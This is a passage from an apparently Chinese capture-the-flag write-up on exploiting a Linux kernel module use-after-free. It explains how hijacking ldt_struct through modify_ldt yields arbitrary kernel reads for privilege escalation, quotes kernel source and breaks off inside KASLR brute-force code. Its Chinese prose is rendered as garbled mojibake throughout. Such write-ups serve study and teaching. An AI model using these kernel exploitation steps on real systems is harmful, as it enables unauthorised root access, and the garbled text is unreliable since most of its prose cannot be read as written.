class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™æ®µä»£ç å°±ä¸éš¾ç†è§£äº†ï¼ˆ<del>ä¸ç”¨ç†è§£äº†</del>ï¼‰ï¼Œv6 æŒ‡å‘<code>current_task-&gt;cred-&gt;user-&gt;__count</code>ï¼Œè€Œ <code>__count</code> æ˜¯ user_struct ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œä¹Ÿå°±æ˜¯ v6 æŒ‡å‘ <code>current_task-&gt;cred-&gt;user</code></p><blockquote><p>èµ›åçœ‹å‡ºé¢˜äººç»™çš„æºç ï¼Œè¿™ä¸€æ®µä»£ç å…¶å®å°±åªæ˜¯ä¸€ä¸ª <code>get_current_user()</code></p></blockquote><p>é‚£ä¹ˆä¸‹é¢çš„ä»£ç æˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯æ£€æµ‹ <code>current_task-&gt;cred-&gt;user-&gt;uid-&gt;val</code>ï¼ˆuid é‡Œé¢å°±å°è£…äº†ä¸€ä¸ª valï¼‰ æ˜¯å¦ä¸º0 ï¼Œè‹¥ä¸º 0 ä¹Ÿå°±æ˜¯ root æ‰ä¼šè¿›å…¥åˆ° kernote_ioctl_cold ä¸­</p><p><img src="https://i.loli.net/2021/10/27/VzDEscud1xeKiP5.png" alt="image.png"></p><p>æœ€ç»ˆ kernote_ioctl_cold ä¼šæ‰“å° note ä¸­å­˜çš„ object çš„åœ°å€ï¼Œ<strong>ä½†æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è‚¯å®šä¸æ˜¯ root æ‰€ä»¥è¿™ä¸ªåŠŸèƒ½æ²¡æœ‰ä»»ä½•æ„ä¹‰</strong></p><p><img src="https://i.loli.net/2021/10/27/fzorATm3OpHydl9.png" alt="image.png"></p><blockquote><p>è¿™ä¸ªåŠŸèƒ½å½“æ—¶è¿˜å·®ç‚¹è®©ç¬”è€…åˆ†æé”™æ–¹å‘ï¼Œæˆ‘ä»¬å‰é¢å·²ç»æœ‰äº†ä¸€ä¸ª UAFï¼Œä½†åœ¨æ­¤å¤„è°ƒç”¨ get_current_user() æ—¶ user çš„å¼•ç”¨è®¡æ•°å™¨ï¼ˆuser-&gt;__countï¼‰è‡ªåŠ¨ + 1ï¼Œè€Œåœ¨ç»“æŸæ—¶å¹¶æ²¡æœ‰è®©å¼•ç”¨è®¡æ•°å™¨è‡ªå‡ 1ï¼ˆæ²¡æœ‰â€œé‡Šæ”¾â€æ‰å¼•ç”¨ï¼‰ï¼Œè¿™æœ¬èº«ä¹Ÿç®—æ˜¯ä¸€ä¸ª bugï¼Œä½†å®è´¨ä¸Šä¸è§£é¢˜æ˜¯æ— å…³çš„ bug</p><blockquote><p>å½“ç„¶ï¼Œè¿™ä¸ª bug ä¹Ÿæ²¡æ³•å¸®åŠ©æˆ‘ä»¬å®Œæˆææƒ</p></blockquote><p>å› è€Œå®˜æ–¹å½“æ—¶å‘äº†è¿™æ ·ä¸€ä¸ªå…¬å‘Šï¼š</p><p><img src="https://i.loli.net/2021/10/29/KYq9ACw7eZhFXPv.png" alt="image.png"></p><p>ç”±äºç¬”è€…çš„è‹±æ–‡æ°´å¹³è‡ªä»ä¸Šäº†å¤§å­¦ä¹‹åä¾¿å‡ ä¹æ²¡æœ‰é•¿è¿›ï¼Œåœ¨ç¬”è€…çœ‹æ¥â€”â€”<code>release</code> æŒ‡çš„åº”è¯¥å°±æ˜¯ <code>free</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡çš„æ˜¯å‰é¢çš„å‚æ‚¬æŒ‡é’ˆå¹¶ä¸æ˜¯é¢˜ç›®çš„è€ƒå¯Ÿç‚¹ï¼ˆé‚£è¿™è¿˜æ€ä¹ˆè§£é¢˜å•Šï¼‰ï¼Œäºæ˜¯æœ‰äº†å¦‚ä¸‹å¯¹è¯ï¼š</p><p><img src="https://i.loli.net/2021/10/29/uyaowMvQY4INV32.png" alt="image.png"></p><p><del>è™½ç„¶æœ€åç›´åˆ°æ¯”èµ›ç»“æŸç¬”è€…ä¹Ÿæ²¡è§£å‡ºè¿™é“é¢˜</del></p></blockquote><h2 id="äºŒã€æ¼æ´åˆ©ç”¨-1"><a href="#äºŒã€æ¼æ´åˆ©ç”¨-1" class="headerlink" title="äºŒã€æ¼æ´åˆ©ç”¨"></a>äºŒã€æ¼æ´åˆ©ç”¨</h2><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªæœ‰ä¸€ä¸ª UAFï¼Œè€Œä¸”åªèƒ½å†™ 8 å­—èŠ‚ï¼Œæ²¡æ³•ç›´æ¥æ³„éœ²å†…æ ¸ç›¸å…³æ•°æ®ï¼Œåˆ†é…çš„ object å¤§å°é™åˆ¶ä¸º 32ï¼Œè¿™æ— ç–‘ä¸ºæˆ‘ä»¬çš„è§£é¢˜å¢æ·»äº†ä¸€å®šéš¾åº¦</p><h3 id="ldt-struct-ç»“æ„ä½“"><a href="#ldt-struct-ç»“æ„ä½“" class="headerlink" title="ldt_struct ç»“æ„ä½“"></a>ldt_struct ç»“æ„ä½“</h3><p>ç¬”è€…å‚ç…§å®˜æ–¹é¢˜è§£é€‰æ‹©ä½¿ç”¨ <code>ldt_struct</code> è¿™ä¸ªå†…æ ¸ç»“æ„ä½“è¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ï¼Œè¿™é‡Œå…ˆç®€å•è®²ä¸€ä¸‹è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼š</p><p>ldt å³<strong>å±€éƒ¨æ®µæè¿°ç¬¦è¡¨</strong>ï¼ˆ<strong>Local Descriptor Table</strong>ï¼‰ï¼Œå…¶ä¸­å­˜æ”¾ç€<strong>è¿›ç¨‹çš„</strong>æ®µæè¿°ç¬¦ï¼Œæ®µå¯„å­˜å™¨å½“ä¸­å­˜æ”¾ç€çš„æ®µé€‰æ‹©å­ä¾¿æ˜¯æ®µæè¿°ç¬¦è¡¨ä¸­æ®µæè¿°ç¬¦çš„ç´¢å¼•</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç  <code>arch/x86/include/asm/mmu_context.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“å¤§å°ä»…ä¸º 0x10ï¼Œåœ¨åˆ†é…æ—¶ slab åˆ†é…å™¨æ¯«æ— ç–‘é—®ä¼šä» kmalloc-32 ä¸­å–ï¼Œä¸”æˆ‘ä»¬å¯æ§çš„å…¶å‰å…«ä¸ªå­—èŠ‚åˆåˆšå¥½æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä¸ºæˆ‘ä»¬åç»­çš„åˆ©ç”¨æä¾›äº†ä¸€å®šçš„ä¾¿åˆ©æ€§</p><h4 id="desc-struct-ç»“æ„ä½“"><a href="#desc-struct-ç»“æ„ä½“" class="headerlink" title="desc_struct ç»“æ„ä½“"></a>desc_struct ç»“æ„ä½“</h4><p>æˆ‘ä»¬æ‰€èƒ½æ§åˆ¶çš„ entries æŒ‡é’ˆä¸º <code>desc_struct</code> ç»“æ„ä½“ï¼Œå³<strong>æ®µæè¿°ç¬¦</strong>ï¼Œå®šä¹‰äº <code>/arch/x86/include/asm/desc_defs.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><h5 id="ä½-32-ä½"><a href="#ä½-32-ä½" class="headerlink" title="ä½ 32 ä½"></a>ä½ 32 ä½</h5><table><thead><tr><th align="center">31~16</th><th align="center">15~0</th></tr></thead><tbody><tr><td align="center">æ®µåŸºå€çš„ 15~0 ä½</td><td align="center">æ®µç•Œé™çš„ 15~0 ä½</td></tr></tbody></table><p>æ®µåŸºå€ 32 ä½ï¼Œæ®µç•Œé™ä¸º 20 ä½ï¼Œå…¶æ‰€èƒ½å¤Ÿè¡¨ç¤ºçš„åœ°å€èŒƒå›´ä¸ºï¼š</p><p><code>æ®µåŸºå€ + ï¼ˆæ®µç²’åº¦å¤§å° x ï¼ˆæ®µç•Œé™+1ï¼‰ï¼‰ - 1</code></p><h5 id="é«˜-32-ä½"><a href="#é«˜-32-ä½" class="headerlink" title="é«˜ 32 ä½"></a>é«˜ 32 ä½</h5><table><thead><tr><th align="center">31~24</th><th align="center">23</th><th align="center">22</th><th align="center">21</th><th align="center">20</th><th align="center">19~16</th><th align="center">15</th><th align="center">14~13</th><th align="center">12</th><th align="center">11~8</th><th align="center">7~0</th></tr></thead><tbody><tr><td align="center">æ®µåŸºå€çš„ 31~24 ä½</td><td align="center">G</td><td align="center">D&#x2F;B</td><td align="center">L</td><td align="center">AVL</td><td align="center">æ®µç•Œé™çš„ 19 ~16 ä½</td><td align="center">P</td><td align="center">DPL</td><td align="center">S</td><td align="center">TYPE</td><td align="center">æ®µåŸºå€çš„ 23~16 ä½</td></tr></tbody></table><p>å„å‚æ•°ä¾¿ä¸åœ¨æ­¤èµ˜å™äº†ï¼Œå…·å…¶æ„é€ å¯ä»¥å‚è§<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGlobal Descriptor Tableï¼‰ - arttnba3.cn</a></p><h3 id="modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>modify_ldt ç³»ç»Ÿè°ƒç”¨</h3><p>Linux æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªå« <code>modify_ldt</code> çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé€šè¿‡è¯¥ç³»ç»Ÿè°ƒç”¨æˆ‘ä»¬å¯ä»¥<strong>è·å–æˆ–ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ LDT</strong></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹åœ¨å†…æ ¸ä¸­è¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯å¦‚ä½•æ“çºµ ldt çš„ï¼Œè¯¥ç³»ç»Ÿè°ƒç”¨å®šä¹‰äº <code>/arch/x86/kernel/ldt.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åº”å½“ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼šfuncã€ptrã€bytecountï¼Œå…¶ä¸­ ptr åº”ä¸ºæŒ‡å‘ <code>user_desc</code> ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œå‚ç…§ man page å¯çŸ¥è¯¥ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="read-ldt-ï¼šå†…æ ¸ä»»æ„åœ°å€è¯»"><a href="#read-ldt-ï¼šå†…æ ¸ä»»æ„åœ°å€è¯»" class="headerlink" title="read_ldt()ï¼šå†…æ ¸ä»»æ„åœ°å€è¯»"></a>read_ldt()ï¼šå†…æ ¸ä»»æ„åœ°å€è¯»</h4><p>å®šä¹‰äº <code>/arch/x86/kernel/ldt.c</code>ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼š<strong>ç›´æ¥è°ƒç”¨ copy_to_user å‘ç”¨æˆ·åœ°å€ç©ºé—´æ‹·è´æ•°æ®</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æ˜¯èƒ½å¤Ÿæ§åˆ¶ ldt-&gt;entries ä¾¿èƒ½å¤Ÿå®Œæˆå†…æ ¸çš„ä»»æ„åœ°å€è¯»ï¼Œç”±æ­¤æ³„éœ²å‡ºå†…æ ¸æ•°æ®</p><h4 id="write-ldt-ï¼šåˆ†é…æ–°çš„-ldt-struct-ç»“æ„ä½“"><a href="#write-ldt-ï¼šåˆ†é…æ–°çš„-ldt-struct-ç»“æ„ä½“" class="headerlink" title="write_ldt()ï¼šåˆ†é…æ–°çš„ ldt_struct ç»“æ„ä½“"></a>write_ldt()ï¼šåˆ†é…æ–°çš„ ldt_struct ç»“æ„ä½“</h4><p>å®šä¹‰äº <code>/arch/x86/kernel/ldt.c</code>ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ write_ldt() å½“ä¸­ä¼šä½¿ç”¨ alloc_ldt_struct() å‡½æ•°æ¥ä¸ºæ–°çš„ ldt_struct åˆ†é…ç©ºé—´ï¼Œéšåå°†ä¹‹åº”ç”¨åˆ°è¿›ç¨‹ï¼Œ alloc_ldt_struct() å‡½æ•°å®šä¹‰äº <code>arch/x86/kernel/ldt.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œldt_struct ç»“æ„ä½“é€šè¿‡ kmalloc() ä» <code>kmalloc-xx</code> ä¸­å–ï¼Œå¯¹äº slab åˆ†é…å™¨å³ä¸ºä» <code>kmalloc-32</code> ä¸­å–ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹è§£é¢˜æ€è·¯ï¼š</p><ul><li>å…ˆåˆ†é…ä¸€ä¸ª object åé‡Šæ”¾</li><li>é€šè¿‡ write_ldt() å°†è¿™ä¸ª object é‡æ–°å–å›</li><li>é€šè¿‡ UAF æ›´æ”¹ ldt-&gt;entries</li><li>é€šè¿‡ read_ldt() æœç´¢å†…æ ¸åœ°å€ç©ºé—´</li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•å®Œæˆææƒ</p><h3 id="è§£æ³•ä¸€ï¼šéå†å†…å­˜ä¿®æ”¹è¿›ç¨‹-cred-ææƒï¼ˆå®˜æ–¹è§£æ³•ï¼‰"><a href="#è§£æ³•ä¸€ï¼šéå†å†…å­˜ä¿®æ”¹è¿›ç¨‹-cred-ææƒï¼ˆå®˜æ–¹è§£æ³•ï¼‰" class="headerlink" title="è§£æ³•ä¸€ï¼šéå†å†…å­˜ä¿®æ”¹è¿›ç¨‹ cred ææƒï¼ˆå®˜æ–¹è§£æ³•ï¼‰"></a>è§£æ³•ä¸€ï¼šéå†å†…å­˜ä¿®æ”¹è¿›ç¨‹ cred ææƒï¼ˆå®˜æ–¹è§£æ³•ï¼‰</h3><p>è¿™ä¸ªè§£æ³•æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£æ³•ï¼Œåˆ©ç”¨ modify_ldt ç³»ç»Ÿè°ƒç”¨å®Œæˆå¯¹å†…æ ¸ç©ºé—´çš„éå†ä¸ä¿®æ”¹</p><h4 id="Step-I-æ³„éœ²-page-offset-base"><a href="#Step-I-æ³„éœ²-page-offset-base" class="headerlink" title="Step I. æ³„éœ² page_offset_base"></a>Step I. æ³„éœ² page_offset_base</h4><p>ç”±äºå¼€å¯äº† kaslr çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬éœ€è¦æƒ³æ–¹æ³•æ³„éœ²å†…æ ¸ç©ºé—´ç›¸å…³åœ°å€ï¼Œåœ¨è¿™é‡Œå®˜æ–¹é¢˜è§£ç»™å‡ºäº†ä¸€ç§ç¾å¦™çš„è§£æ³•â€”â€”æˆ‘ä»¬å¯ä»¥<strong>ç›´æ¥çˆ†ç ´å†…æ ¸åœ°å€</strong>ï¼šå¯¹äºæ— æ•ˆçš„åœ°å€ï¼Œcopy_to_user ä¼šè¿”å›é 0 å€¼ï¼Œæ­¤æ—¶ read_ldt() çš„è¿”å›å€¼ä¾¿æ˜¯ <code>-EFAULT</code>ï¼Œå½“ read_ldt() æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œè¯´æ˜æˆ‘ä»¬å‘½ä¸­äº†å†…æ ¸ç©ºé—´</p><p>çˆ†ç ´ä»£ç é€»è¾‘å¾ˆå®¹æ˜“å°±èƒ½å†™å‡ºæ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span>                temp;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span 